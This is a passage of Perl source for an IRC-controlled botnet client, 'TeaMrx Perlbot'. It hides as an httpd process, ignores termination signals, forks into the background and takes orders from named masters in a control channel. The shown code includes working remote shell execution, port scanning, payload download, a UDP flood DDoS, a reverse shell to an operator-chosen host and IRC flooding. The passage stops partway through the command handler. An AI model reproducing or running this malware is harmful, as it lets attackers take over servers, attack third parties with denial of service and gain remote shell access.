#!/usr/bin/perl
#
# TeaMrx Perlbot vS xeQT
#
my @mast3rs = ("Sistem",
   "Switers",
   "rootblue");


my @admchan=("#break");

$servidor='irc.starindo.net' unless $servidor;


my $xeqt = "!x";
my $homedir = "/tmp";
my $shellaccess = 1;
my $xstats = 1;
my $pacotes = 1;
my $linas_max = 5;
my $sleep = 6;
my $portime = 4;

my @fakeps = ("/usr/local/apache/bin/httpd -DSSL",
   "/usr/sbin/httpd -k start -DSSL",
   "/usr/sbin/httpd",
   "spamd child",
   "httpd");

my @nickname = ("ce^^asik","ce^asik","cwe_tmbem","cwe_anu","ce_nyari","ce-bongsai","cew_gilak","ce-penasarn","ce_ajai","ce_sesak","Alda",
"Aleks","Allison","Alongi","Altavilla","Altenberger","Altenhofen","Amaral","Amatangelo","Ameer","Amsden","Anand","Andel",
"Ando","Andrelus","Andron","Anfinrud","Ansley","Anthony","Antos","Arbia","Arduini","Arellano","Aristotle","Arjas","Arky","Atkins",
"Augustus","Aurelius","Axelrod","Axworthy","Ayiemba","Aykroyd","Ayling","Azima","Bachmuth","Backus","Bady","Baglivo","Bagnold",
"Bailar","Bakanowsky","Baleja","Ballatori","Ballew","Baltz","Banta","Barabesi","Barajas","Baranczak","Baranowska","Barberi","Barbetti",
"Barneson","Barnett","Barriola","Barry","Bartholomew","Bartolome","Bartoo","Basavappa","Bashevis","Batchelder","Baumiller","Bayles","Bayo",
"Beacon","Beal","Bean","Beckman","Beder","Bedford","Behenna","Belanger","Belaoussof","Belfer","Belin-Collart","Bellavance","Bellhouse",
"Bellini","Belloc","Benedict-Dye","Bergson","Berke-Jenkins","Bernardo","Bernassola","Bernston","Berrizbeitia","Betti","Beynart","Biagioli",
"Bickel","Binion","Bir","Bisema","Bisho","Blackbourn","Blackwell","Blagg","Blakemore","Blanke","Bliss","Blizard","Bloch","Bloembergen",
"Bloemhof","Bloxham","Blyth","Bolger","Bolick","Bollinger","Bologna","Boner","Bonham","Boniface","Bontempo","Book","Bookbinder","Boone",
"Boorstin","Borack","Borden","Bossi","Bothman","Botosh","Boudin","Boudrot","Bourneuf","Bowers","Boxer","Boyajian","Boyes","Boyland",
"Boym","Boyne","Bracalente","Bradac","Bradach","Brecht","Breed","Brenan","Brennan","Brewer","Brewer","Bridgeman","Bridges","Brinton",
"Britz","Broca","Brook","Brzycki","Buchan","Budding","Bullard","Bunton","Burden","Burdzy","Burke","Burridge","Busetta","Byatt","Byerly",
"Byrd","Cage","Calnan","Cammelli","Cammilleri","Canley","Capanni","Caperton","Capocaccia","Capodilupo","Cappuccio","Capursi","Caratozzolo",
"Carayannopoulos","Carlin","Carlos","Carlyle","Carmichael","Caroti","Carper","Cartmill","Cascio","Case","Caspar","Castelda","Cavanagh",
"Cavell","Ceniceros","Cerioli","Chapman","Charles","Cheang","Cherry","Chervinsky","Chiassino","Chien","Childress","Childs","Chinipardaz",
"Chinman","Christenson","Christian","Christiano","Christie","Christopher","Chu","Chupasko","Church","Ciampaglia","Cicero","Cifarelli",
"Claffey","Clancy","Clark","Clement","Clifton","Clow","Coblenz","Coito","Coldren","Colella","Collard","Collis","Compton","Compton",
"Comstock","Concino","Condodina","Connors","Corey","Cornish","Cosmides","Counter","Coutaux","Crawford","Crocker","Croshaw","Croxen",
"Croxton","Cui","Currier","Cutler","Cvek","Cyders","daSilva","Daldalian","Daly","D'Ambra","Danieli","Dante","Dapice","D'arcangelo","Das",
"Dasgupta","Daskalu","David","Dawkins","DeGennaro","DeLaPena","del'Enclos","deRousse","Debroff","Dees","Defeciani","Delattre","Deleon-Rendon",
"Delger","Dell'acqua","Deming","Dempster","Demusz","Denault","Denham","Denison","Desombre","Deutsch","D'fini","Dicks","Diefenbach","Difabio",
"Difronzo","Dilworth","Dionysius","Dirksen","Dockery","Doherty","Donahue","Donner","Doonan","Dore","Dorf","Dosi","Doty","Doug","Dowsland",
"Drinker","D'souza","Duffin","Durrett","Dussault","Dwyer","Eardley","Ebeling","Eckel","Edley","Edner","Edward","Eickenhorst","Eliasson",
"Elmendorf","Elmerick","Elvis","Encinas","Enyeart","Eppling","Erbach","Erdman","Erdos","Erez","Espinoza","Estes","Etter","Euripides",
"Everett","Fabbris","Fagan","Faioes","Falco-Acosta","Falorsi","Faris","Farone","Farren","Fasso'","Fates","Feigenbaum","Fejzo","Feldman",
"Fernald","Fernandes","Ferrante","Ferriell","Feuer","Fido","Field","Fink","Finkelstein","Finnegan","Fiorina","Fisk","Fitzmaurice","Flier",
"Flores","Folks","Forester","Fortes","Fortier","Fossey","Fossi","Francisco","Franklin-Kenea","Franz","Frazier-Davis","Freid","Freundlich",
"Fried","Friedland","Frisken","Frowiss","Fryberger","Frye","Fujii-Abe","Fuller","Furth","Fusaro","Gabrielli","Gaggiotti","Galeotti","Galwey",
"Gambini","Garfield","Garman","Garonna","Geller","Gemberling","Georgi","Gerrett","Ghorai","Gibbens","Gibson","Gilbert","Gili","Gill","Gillispie",
"Gist","Gleason","Glegg","Glendon","Goldfarb","Goncalves","Good","Goodearl","Goody","Gozzi","Gravell","Greenberg","Greenfeld","Griffiths",
"Grigoletto","Grummell","Gruner","Gruppe","Guenthart","Gunn","Guo","Ha","Haar","Hackman","Hackshaw","Haley","Halkias","Hallowell","Halpert",
"Hambarzumjan","Hamer","Hammerness","Hand","Hanssen","Harding","Hargraves","Harlow","Harrigan","Hartman","Hartmann","Hartnett","Harwell",
"Haviaras","Hawkes","Hayes","Haynes","Hazlewood","Heermans","Heft","Heiland","Hellman","Hellmiss","Helprin","Hemphill","Henery","Henrichs",
"Hernandez","Herrera","Hester","Heubert","Heyeck","Himmelfarb","Hind","Hirst","Hitchcock","Hoang","Hock","Hoffer","Hoffman","Hokanson","Hokoda",
"Holmes","Holoien","Holter","Holway","Holzman","Hooker","Hopkins","Horsley","Hoshida","Hostage","Hottle","Howard","Hoy","Huey","Huidekoper",
"Hungerford","Huntington","Hupp","Hurtubise","Hutchings","Hyde","Iaquinta","Ichikawa","Igarashi","Inamura","Inniss","Isaac","Isaievych","Isbill",
"Isserman","Iyer","Jacenko","Jackson","Jagers","Jagger","Jagoe","Jain","Jamil","Janjigian","Jarnagin","Jarrell","Jay","Jeffers","Jellis",
"Jenkins","Jespersen","Jewett","Johannesson","Johannsen","Johns","Jolly","Jorgensen","Jucks","Juliano","Julious","Kabbash","Kaboolian","Kafadar",
"Kalbfleisch","Kaligian","Kalil","Kalinowski","Kalman","Kamel","Kangis","Karpouzes","Kassower","Kasten","Kawachi","Kee","Keenan","Keepper",
"Keith","Kelker","Kelsey","Kempton","Kemsley","Kendall","Kerry","Keul","Khong","Kimmel","Kimmett","Kimura","Kindall","Kinsley","Kippenberger",
"Kirscht","Kittridge","Kleckner","Kleiman","Kleinfelder","Klemperer","Kling","Klinkenborg","Klint","Knuff","Kobrick","Koch","Kohn","Koivumaki",
"Kommer","Koniaris","Konrad","Kool","Korzybski","Kotter","Kovaks","Kraemer","Krailo","Krasney","Kraus","Kroemer","Krysiak","Kuenzli","Kumar",
"Kusman","Kuwabara","La","Labunka","Lafler","Laing","Lallemant","Landes","Lankes","Lantieri","Lanzit","Laserna","Lashley","Lawless","Lecar",
"Lecce","Leclercq","Leite","Lenard","Sofia","Lesser","Lessi","Liakos","Lidano","Liem","Light","Lightfoot","Lim","Linares","Linda","Linder");

my @xident = ("noway","mirc","cmd","index","main","php","vuln","iiris","bx","sun","khan",
   "info","cpu","pet","pacs","dino","megov","onet","xrm","tisi","parm","cico","jun",
   "caos","fred","peace","dude","rox","rock","rokie","bayrn","gees","hval","wolf",
   "do","go","ln","st","file","page","pag","pg","lg","lang","lng","srcs","action",
   "sml","pod","nvidia","vidia","villa","kake","spat","solo","Cols","kols","kreft",
   "lam","fal","dett","drop","snop","true","fake","yes","sir","mae","nmf","vmax","as",
   "adio","audo","soren","tvtre","host","unitd","coda","cobra","mans","gmail","gtrs",
   "remax","rik","fatig","poor","girls","pow","wop","wok","son","kolsa","royk","asss",
   "los","las","angl","dream","fools","phol","phools","d0rk","spon","spalk","kalk",
   "email","smtp","pops","imapd","pag","lang","lg","nav","php","spyer","cyp","hardy",
        "email","null","mastr","drunk","full","beer","bayer","mage","neve","fist","haist",
        "dara","dora","boris","dev","cupra","isgal","Yuri","Geez","Frys","dos","to","emul",
        "pwned","kung","kim","lil","fatjo","fatman","fat","joe","does","quat","tres","eu",
   "shv5","lrk","lkm","lkmrk","trk5","xt","tqex","itt","full","half","power","sender",
   "does","tres","quat","fiat","spon","kvae","liim","papp","ddos","fart","noz","daim",
   "liga","tvone","shdw","etcpwd","initd","ftpd","wuspl","proftp","newsd","sockd","lue",
   "loma","Domma","hest","heist","tivoli","stud","dust","fust","Flue","nille","kenny",
   "koma","loc","inc","incl","src","fokus","ford","chevy","wrc","cpu","cool","srchers",
   "inc","incl","dir","file","sdir","mains","login","path","base","cmd","cats","farts",
   "fiat","uno","jern","kober","liq","torsk","fisk","laks","hone","hore","buk","noman",
   "lim","idem","prince","sveina","kine","kim","allan","hanne","terje","bukken","bruse",
   "nu","do","li","faen","tater","doc","loc","pof","ninja","per","pets","sings","doper",
   "liq","dop","heroin","dok","page","php3","pop","smtp","data","kilde","foss","lowrdr",
   "drvby","viper","snake","dragon","dup","vuln","cat","grep","loop","inetd","proftpd",
   "pasive","damp","wals","snoke","snik","poff","phil","pill","dra","drjo","djo","laby",
   "rune","alan","britt","brita","stue","stenen","andy","bass","phatt","lover","fresa",
   "jvc","jbl","cia","fed","sov","purk","snut","snif","deka","svovel","life","knife","so",
   "deka","bos","boss","fres","spett","dusj","kappe","norman","keb0rd","fab","dor","bits",
   "kniv","lisa","nina","ole","pat","mtv","charl","smokie","nabo","walk","brks","krad-3",
   "dame","lady","bola","biffen","kamm","drev","sprider","spider","iscrem","daddy","pie",
          "ono","tima","mytm","motor","vsmot","sport","fart","devs","var","tmp","spol","sture".
        "jule","tree","gate","net","rand","perl","line","xqt","mrx","org","asus","sped","yaco",
   "hash","hmm","ddos","pwr","nix","linux","bsd","ppal","aio","mars","bates","daim","da",
   "pico","nmap","juge","sone","log","goofy","kars","meter","daim","kul","foksy","hyena",
   "beta","pulse","driver","org","fos","kars","kma","fua","all","tea","foks","lady","fa",
   "testo","bola","bolen","card","cards","chip","chips","wv","audi","bmw","roys","bechs",
   "nokia","mrx","some","candy","goo","cool","scam","scan","google","lee","cam","li","dm",
   "loff","grov","abcd","pulse","grow","alrt","spyd","trojan","maxd","xeqtd","xQtd","nodz",
   "owner","crime","data","need","doper","hash","mysql","imapd","devil","shark","byn","ju");

my @xname = ("Googurl (C) 2006 xeQt","www.Google.com","* Im to lame to read Bitchx.doc *","BiatchX",
   "Tveita Gjengen","Bgjengen","Agjengen","locos","putas","spooon","Type-R Turbo","Civic R Turbo",
   "mIRC 6.1","* Im so lame i cant ready BitchX.doc *","Bill Gates","Cannon","Mtv","nos","nozzz",
   "Sport Crew","vTeam","Turbo","random","paypal","netscam","www.milw0rm.com","lee","av","freace",
   "trojan donkey","Monster Garage","Garage Inc.","Pimp Ma Shit","Pimp my ride","Freak out","Doch",
   "www.packetstormsecurity.org","www.linux.com","www.freebsd.org","Hello There","tyson","mekkkka",
   "Im just myself man","Can u get the clue?","Im not the only one","Fear the lions","mekka","nooo",
   "Dragons back","Turbo Quattro","Sport Quattro","aheh goofy","Just for phun","gBill","goa","Yesir",
   "Thats my mofo name","Snoooop Doggy Style...","Tricky Trickey","love, peace, and xeQt","rbot","ha",
   "Clap your hands","one two tree, bass","lions","Drugs, sex, and xtc","i hate that biatch","ali",
   "Go fuck yourself","whois meeee","Fatjoe Corp","Brooklyn Bounche","Dj Pulsedriver","lee","furu",
   "Random","You have no clue","This rocks","uranium","BinLaden","Ted Bundy","Charlie Cheeens","hans",
   "Will Smith","Freash Prince On IRC","Freash prince in bel air","Powered By PHPBB","mambo","ruy",
   "dj pulse","Powered By xeQt","Delux","2pac","Biggie","Fuck sadam","Allah","Im your god idiot","id",
   "Im to lame to read BitchX.doc","Boika","Diamonds","Jean claude Van dame","Arnold Schwartsneger",
   "Stig","Anothony","White Power","Just do it","vSmotor vs. Turbo","Nismo Skyline GT-R R34","MySquad",
   "Honda Civic Type-R","Maria Carrey","Terror Squad","I'm to lame to read BitchX.doc","w33d","hugo",
   "WinXP 1999 (C) Bill Gates","Microsoft windows xeQtxpress","xeQt vS Mrx Team","Apache httpd server",
   "arne","line","geir","terje","synne","linda","frode","my name?","teamrxPress","xeqters","asus power",
   "Crash Test Dummy","Madonna","vX power","Team Windows","Bill Gates","Bill Gatez","Thats my girl...",
   "Phunter","panter","Snaked","Hunted","Victums","PHPSH","mod_com_xQt","com_xeQter","com_team","assa",
   "Nokia, Connecting People...","BitchX","smoke and fly","com_xeQt_Performance","TeaMrx Performance",
   "xQt","Perlbot version vx9m0d v3","Googurl","Google lovers","xeQt_com","mrx_unit","com_asus","haist",
   "TeaMrx Crew","xQt vS TeaMrx","xeQt vS Mrx","Powered by TeaMrx","Powered by xQt","com_xQt_mrx","com_x",
   "com_teamrx","xeQt the way to go","Perl monks","perlhackers","perl genius","perl team","perl scanner",
   "San Francisco","New York Gangbang..","Team Norway","Team Europe","Team Germany","Team Work","jet lie");

#################
# Random Ports
#################
my @rports = ("6667");

my @Mrx = ("\001mIRC32 v5.91 K.Mardam-Bey\001","\001mIRC v6.2 Khaled Mardam-Bey\001",
   "\001mIRC v6.03 Khaled Mardam-Bey\001","\001mIRC v6.14 Khaled Mardam-Bey\001",
   "\001mIRC v6.15 Khaled Mardam-Bey\001","\001mIRC v6.16 Khaled Mardam-Bey\001",
   "\001mIRC v6.17 Khaled Mardam-Bey\001","\001mIRC v6.21 Khaled Mardam-Bey\001",
   "\001Snak for Macintosh 4.9.8 English\001",
   "\001DvC v0.1 PHP-5.1.1 based on Net_SmartIRC\001",
   "\001PIRCH98:WIN 95/98/WIN NT:1.0 (build 1.0.1.1190)\001",
   "\001xchat 2.6.2 Linux 2.6.18.5 [i686/2.67GHz]\001",
   "\001xchat:2.4.3:Linux 2.6.17-1.2142_FC4 [i686/2,00GHz]\001",
   "\001xchat:2.4.3:Linux 2.6.17-1.2142_FC4 [i686/1.70GHz]\001",
   "\001XChat-GNOME IRC Chat 0.16 Linux 2.6.20-8-generic [i686]\001",
   "\001ircN 7.27 + 7.0 - -\001","\001..(argon/1g) :bitchx-1.0c17\001",
   "\001ircN 8.00 - he tries to tell me what I put inside of me -\001",
   "\001FreeBSD!4.11-STABLE bitchx-1.0c18 - prevail[0123] :down with people\001",
   "\001BitchX-1.0c19+ by panasync - Linux 2.4.31 : Keep it to yourself!\001",
   "\001BitchX-1.0c19+ by panasync - Linux 2.4.33.3 : Keep it to yourself!\001",
   "\001BitchX-1.1-final+ by panasync - Linux 2.6.18.1 : Keep it to yourself!\001",
   "\001BitchX-1.0c19 by panasync - freebsd 4.10-STABLE : Keep it to yourself!\001",
   "\001BitchX-1.1-final+ by panasync - FreeBSD 4.5-STABLE : Keep it to yourself!\001",
   "\001BitchX-1.1-final+ by panasync - FreeBSD 6.0-RELEASE : Keep it to yourself!\001",
   "\001BitchX-1.1-final+ by panasync - FreeBSD 5.3-RELEASE : Keep it to yourself!\001",
   "\001bitchx-1.0c18 :tunnelvision/1.2\001","\001PnP 4.22 - http://www.pairc.com/\001",
   "\001BitchX-1.0c17/FreeBSD 4.10-RELEASE:(c)rackrock/bX [3.0.1�9] : Keep it to yourself!\001",
   "\001P&P 4.22.2 (in development) + X Z P Bots, Sound, NickServ, ChanServ, Extras\001",
   "\001HydraIRC v0.3.148 (18/Jan/2005) by Dominic Clifton aka Hydra - #HydraIRC on EFNet\001",
   "\001irssi v0.8.10 - running on Linux i586\001","\001irssi v0.8.10 - running on FreeBSD i386\001",
   "\001ircII 20050423+ScrollZ 1.9.5 (19.12.2004)+Cdcc v1.6mods v1.0 by acidflash - Almost there\001",
   "\001ircII 20050423+ScrollZ 1.9.5 (19.12.2004)+Cdcc v1.8+OperMods v1.0 by acidflash - Almost there\001");

# Default quick scan ports
my @portas=("21","22","23","25","53","80","110","113","143","3306","4000","5900","6667","6668","6669","7000","10000","12345","31337","65501");

# xeQt

#my $nick = "Power";
my $nick = $nickname[rand scalar @nickname];
my $realname = $xname[rand scalar @xname];
my $ircname = $xident[rand scalar @xident];
my $porta = $rports[rand scalar @rports];
my $xproc = $fakeps[rand scalar @fakeps];
my $Mrx = $Mrx[rand scalar @Mrx];
my $version = 'PowerBots (C) GohacK';

$SIG{'INT'} = 'IGNORE';
$SIG{'HUP'} = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'} = 'IGNORE';

use IO::Socket;
use Socket;
use IO::Select;
chdir("$homedir");
$servidor="$ARGV[0]" if $ARGV[0];
$0="$xproc"."\0";
my $pid=fork;
exit if $pid;
die "[x] -> Cannot fork into background: $!" unless defined($pid);
my %irc_servers;
my %DCC;
my $dcc_sel = new IO::Select->new();

sub getnick {
  return "$nickname[rand scalar @nickname]".int(rand(1000));
}

sub getstore ($$)
{
  my $url = shift;
  my $file = shift;

  $http_stream_out = 1;
  open(GET_OUTFILE, "> $file");
  %http_loop_check = ();
  _get($url);
  close GET_OUTFILE;
  return $main::http_get_result;
}
sub _get
{
  my $url = shift;
  my $proxy = "";
  grep {(lc($_) eq "http_proxy") && ($proxy = $ENV{$_})} keys %ENV;
  if (($proxy eq "") && $url =~ m,^http://([^/:]+)(?::(\d+))?(/\S*)?$,) {
    my $host = $1;
    my $port = $2 || 80;
    my $path = $3;
    $path = "/" unless defined($path);
    return _trivial_http_get($host, $port, $path);
  } elsif ($proxy =~ m,^http://([^/:]+):(\d+)(/\S*)?$,) {
    my $host = $1;
    my $port = $2;
    my $path = $url;
    return _trivial_http_get($host, $port, $path);
  } else {
    return undef;
  }
}
sub _trivial_http_get
{
  my($host, $port, $path) = @_;
  my($AGENT, $VERSION, $p);
  #print "HOST=$host, PORT=$port, PATH=$path\n";

  $AGENT = "get-minimal";
  $VERSION = "20000118";

  $path =~ s/ /%20/g;

  require IO::Socket;
  local($^W) = 0;
  my $sock = IO::Socket::INET->new(PeerAddr => $host, PeerPort => $port, Proto   => 'tcp', Timeout  => 60) || return;

  $sock->autoflush;
  my $netloc = $host;
  $netloc .= ":$port" if $port != 80;
  my $request = "GET $path HTTP/1.0\015\012"
              . "Host: $netloc\015\012"
              . "User-Agent: $AGENT/$VERSION/u\015\012";
  $request .= "Pragma: no-cache\015\012" if ($main::http_no_cache);
  $request .= "\015\012";
  print $sock $request;
  my $buf = "";
  my $n;
  my $b1 = "";
  while ($n = sysread($sock, $buf, 8*1024, length($buf))) {
    if ($b1 eq "") {
      $b1 = $buf;
      $buf =~ s/.+?\015?\012\015?\012//s;
    }
    if ($http_stream_out) { print GET_OUTFILE $buf; $buf = ""; }
  }
  return undef unless defined($n);
  $main::http_get_result = 200;
  if ($b1 =~ m,^HTTP/\d+\.\d+\s+(\d+)[^\012]*\012,) {
    $main::http_get_result = $1;
    # print "CODE=$main::http_get_result\n$b1\n";
    if ($main::http_get_result =~ /^30[1237]/ && $b1 =~ /\012Location:\s*(\S+)/) {
      my $url = $1;
      return undef if $http_loop_check{$url}++;
      return _get($url);
    }
    return undef unless $main::http_get_result =~ /^2/;
  }
  return $buf;
}
$sel_cliente = IO::Select->new();
sub sendraw {
  if ($#_ == '1') {
    my $socket = $_[0];
    print $socket "$_[1]\n";
  } else {
      print $IRC_cur_socket "$_[0]\n";
  }
}
sub conectar {
   my $meunick = $_[0];
   my $servidor_con = $_[1];
   my $porta_con = $_[2];
   my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$servidor_con", PeerPort=>$porta_con) or return(1);
   if (defined($IRC_socket)) {
     $IRC_cur_socket = $IRC_socket;
     $IRC_socket->autoflush(1);
     $sel_cliente->add($IRC_socket);
     $irc_servers{$IRC_cur_socket}{'host'} = "$servidor_con";
     $irc_servers{$IRC_cur_socket}{'porta'} = "$porta_con";
     $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
     $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;
     nick("$meunick");
     sendraw("USER $ircname ".$IRC_socket->sockhost." $servidor_con :$realname");
     sleep 2;
   }
}
my $line_temp;
while( 1 ) {
   while (!(keys(%irc_servers))) { conectar("$nick", "$servidor", "$porta"); }
   delete($irc_servers{''}) if (defined($irc_servers{''}));
   &DCC::connections;
   my @ready = $sel_cliente->can_read(0.6);
   next unless(@ready);
   foreach $fh (@ready) {
     $IRC_cur_socket = $fh;
     $meunick = $irc_servers{$IRC_cur_socket}{'nick'};
     $nread = sysread($fh, $msg, 4096);
     if ($nread == 0) {
        $sel_cliente->remove($fh);
        $fh->close;
        delete($irc_servers{$fh});
     }
     @lines = split (/\n/, $msg);
     for(my $c=0; $c<= $#lines; $c++) {
       $line = $lines[$c];
       $line=$line_temp.$line if ($line_temp);
       $line_temp='';
       $line =~ s/\r$//;
       unless ($c == $#lines) {
         parse("$line");
       } else {
           if ($#lines == 0) {
             parse("$line");
           } elsif ($lines[$c] =~ /\r$/) {
               parse("$line");
           } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
               parse("$line");
           } else {
               $line_temp = $line;
           }
       }
      }
   }
}

sub parse {
   my $servarg = shift;
   if ($servarg =~ /^PING \:(.*)/) {
     sendraw("PONG :$1");
   } elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
       my $pn=$1; my $hostnam3=$3; my $onde = $4; my $args = $5;
       if ($args =~ /^\001VERSION\001$/) {
         notice("$pn", "".$Mrx."");
       }
       elsif ($args =~ /^\001PING\s+(\d+)\001$/) {
         notice("$pn", "\001PONG\001");
       }
       elsif (grep {$_ =~ /^(\Q$pn\E|\Q$hostnam3\E)$/i } @mast3rs) {
         if ($onde eq "$meunick"){
           shell("$pn", "$args");
        }
    if ($args =~ /^!(.*)/){
       ircase("$pn","$chan","$1");
    }
        if ($args =~ /^(\Q$meunick\E|\Q$xeqt\E)\s+(.*)/ ) {
            my $natrix = $1;
            my $arg = $2;
            if ($arg =~ /^\!(.*)/) {
              ircase("$pn","$onde","$1");
            } elsif ($arg =~ /^\@(.*)/) {
                $ondep = $onde;
                $ondep = $pn if $onde eq $meunick;
                bfunc("$ondep","$1");
            } else {
                shell("$onde", "$arg");
            }
         }
       }
   } elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
       if (lc($1) eq lc($meunick)) {
         $meunick=$4;
         $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
       }
   } elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
       $meunick = getnick();
       nick("".$meunick."-");
   } elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
       $meunick = $2;
       $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
       $irc_servers{$IRC_cur_socket}{'nome'} = "$1";
       foreach my $canal (@admchan){
         sendraw("JOIN $canal 206xss");
       }
   }
}
sub bfunc {
  my $printl = $_[0];
  my $funcarg = $_[1];
  if (my $pid = fork) {
     waitpid($pid, 0);
  } else {
      if (fork)
       {
         exit;
       }
   else
   {
      # Quick scan
           if ($funcarg =~ /^ps (.*)/) {
             my $hostip="$1";
        sendraw($IRC_cur_socket, "PRIVMSG $printl :\002\00312Portscanning\003\002: $1 \002\00312Ports:\003\002 default");
             my (@aberta, %porta_banner);
             foreach my $porta (@portas)  {
                my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto => 'tcp', Timeout => $portime);
                if ($scansock) {
                   push (@aberta, $porta);
                   $scansock->close;
         sendraw($IRC_cur_socket, "PRIVMSG $printl :Found: $porta"."/Open");
                }
             }
             if (@aberta) {
               sendraw($IRC_cur_socket, "PRIVMSG $printl :Port Scan Complete with target: $1 ");
             } else {
                 sendraw($IRC_cur_socket,"PRIVMSG $printl :\002[x]\0034 No open ports found on\002 $1");
             }
           }
      # NMAP, lol
           elsif ($funcarg =~ /^nmap\s+(.*)\s+(\d+)\s+(\d+)/)
      {
              my $hostname="$1";
              my $portstart = "$2";
               my $portend = "$3";
               my (@abertas, %porta_banner);
          sendraw($IRC_cur_socket, "PRIVMSG $printl :\002\00312xMap Portscanning\003\002: $1 \002\00312Ports:\003\002 $2-$3");
               foreach my $porta ($portstart..$portend)
             {
               my $scansock = IO::Socket::INET->new(PeerAddr => $hostname, PeerPort => $porta, Proto => 'tcp', Timeout => $portime);
               if ($scansock) {
                 push (@abertas, $porta);
                 $scansock->close;
                 if ($xstats)
       {
                   sendraw($IRC_cur_socket, "PRIVMSG $printl :Found: $porta"."/Open");
                 }
               }
             }
             if (@abertas) {
          sendraw($IRC_cur_socket, "PRIVMSG $printl :\002\00312Scan Complate\003\002");
             } else {
               sendraw($IRC_cur_socket,"PRIVMSG $printl :\002\00312No ports found..\002");
             }
            }
      # Remove
      elsif ($funcarg =~ /^rm/)
      {
         system("cd /var/tmp ; rm -rf .mrx ; rm -rf alex.txt ; rm -rf alex.txt.* vx* mrx*");
      system("cd /tmp ; rm -rf .mrx ; rm -rf alex.txt ; rm -rf alex.* ; mkdir /tmp/.mrx ; cd /tmp/.mrx");
      sendraw($IRC_cur_socket, "PRIVMSG $printl :\002\00312(Quickdel)\002\00314 Removed files and folders ");
      }
      # Version
      elsif ($funcarg =~ /^version/)
      {
         sendraw($IRC_cur_socket, "PRIVMSG $printl :\002\00312(Version)\002\00314 $version ");
      }
      # Download
           elsif ($funcarg =~ /^down\s+(.*)\s+(.*)/)
      {
              getstore("$1", "$2");
              sendraw($IRC_cur_socket, "PRIVMSG $printl :\002\00312(Download)\002\00314 Page: $2 (File: $1)") if ($xstats);
           }
       # Udp
            elsif ($funcarg =~ /^udp\s+(.*)\s+(\d+)\s+(\d+)/) {
              return unless $pacotes;
              socket(Tr0x, PF_INET, SOCK_DGRAM, 17);
              my $alvo=inet_aton("$1");
              my $porta = "$2";
              my $tempo = "$3";
              my $pacote;
              my $pacotese;
              my $fim = time + $tempo;
              my $pacota = 1;
         sendraw($IRC_cur_socket, "PRIVMSG $printl :\002\00312(UDP DDoSing)\003 Attacking\002: $1 - \002Time\002: $tempo"."seconds");
              while (($pacota == "1") && ($pacotes == "1")) {
                $pacota = 0 if ((time >= $fim) && ($tempo != "0"));
                $pacote=$rand x $rand x $rand;
                $porta = int(rand 65000) +1 if ($porta == "0");
                send(Tr0x, 0, $pacote, sockaddr_in($porta, $alvo)) and $pacotese++ if ($pacotes == "1");
              }
              if ($xstats)
              {
               sendraw($IRC_cur_socket, "PRIVMSG $printl :\002\00312(UDP Complete):\003\002 $1 - \002Sendt\002: $pacotese"."kb - \002Time\002: $tempo"."seconds");
             }
            }

       # Backconnect
            elsif ($funcarg =~ /^back\s+(.*)\s+(\d+)/) {
              my $host = "$1";
              my $porta = "$2";
              my $proto = getprotobyname('tcp');
              my $iaddr = inet_aton($host);
              my $paddr = sockaddr_in($porta, $iaddr);
              my $shell = "/bin/sh -i";
              if ($^O eq "MSWin32") {
                $shell = "cmd.exe";
              }
              socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "socket: $!";
              connect(SOCKET, $paddr) or die "connect: $!";
         sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[x] ->\0034 Injection ...");
              open(STDIN, ">&SOCKET");
              open(STDOUT, ">&SOCKET");
              open(STDERR, ">&SOCKET");
              system("$shell");
         system("cd /tmp/.mrx");
              close(STDIN);
              close(STDOUT);
              close(STDERR);
            }
           exit;
       }
  }
}

sub ircase {
  my ($kem, $printl, $case) = @_;

   if ($case =~ /^join (.*)/) {
     j("$1");
   }
   elsif ($case =~ /^part (.*)/) {
      p("$1");
   }
   elsif ($case =~ /^rejoin\s+(.*)/) {
      my $chan = $1;
      if ($chan =~ /^(\d+) (.*)/) {
        for (my $ca = 1; $ca <= $1; $ca++ ) {
          p("$2");
          j("$2");
        }
      } else {
          p("$chan");
          j("$chan");
      }
   }
   elsif ($case =~ /^op/) {
      op("$printl", "$kem") if $case eq "op";
      my $oarg = substr($case, 3);
      op("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
   }
   elsif ($case =~ /^deop/) {
      deop("$printl", "$kem") if $case eq "deop";
      my $oarg = substr($case, 5);
      deop("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
   }
   elsif ($case =~ /^voice/) {
      voice("$printl", "$kem") if $case eq "voice";
      $oarg = substr($case, 6);
      voice("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
   }
   elsif ($case =~ /^devoice/) {
      devoice("$printl", "$kem") if $case eq "devoice";
      $oarg = substr($case, 8);
      devoice("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
   }
   elsif ($case =~ /^msg\s+(\S+) (.*)/) {
      msg("$1", "$2");
   }
   elsif ($case =~ /^flood\s+(\d+)\s+(\S+) (.*)/) {
      for (my $cf = 1; $cf <= $1; $cf++) {
        msg("$2", "$3");
      }
   }
   elsif ($case =~ /^ctcpflood\s+(\d+)\s+(\S+) (.*)/) {
      for (my $cf = 1; $cf <= $1; $cf++) {
        ctcp("$2", "$3");
      }
   }
   elsif ($case =~ /^ctcp\s+(\S+) (.*)/) {
      ctcp("$1", "$2");
   }
   elsif ($case =~ /^invite\s+(\S+) (.*)/) {
      invite("$1", "$2");
   }
   elsif ($case =~ /^nick (.*)/) {
      nick("$1");
   }
   elsif ($case =~ /^jump\s+(\S+)\s+(\S+)/) {
       conectar("$2", "$1", 6667);
   }
   elsif ($case =~ /^send\s+(\S+)\s+(\S+)/) {
      DCC::SEND("$1", "$2");
   }
